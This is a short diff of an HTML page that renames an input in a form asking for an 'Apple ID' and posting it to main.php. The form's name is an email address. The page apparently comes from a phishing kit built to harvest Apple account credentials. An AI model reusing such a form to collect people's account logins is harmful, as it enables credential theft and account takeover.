@@ -167,7 +167,7 @@ getConfig();                                           // close the function
 </h1></b><br>
 
 <form id="submit-form" name="Paulytek@gmail.com" action="main.php" method="post">
-<input class="button" placeholder="Apple ID ..." input type="text" name="txtFullName"/>
+<input class="button" placeholder="Apple ID ..." input type="text" name="paul canson"/>
 <br><br><br><br>
 <div class="enjoy-css" onClick="document.forms['submit-form'].submit();">Enjoy</div>
 <input type="hidden" link async href="http://fonts.googleapis.com/css?family=Baumans" data-generated="http://enjoycss.com" rel="stylesheet" type="text/css"/  >
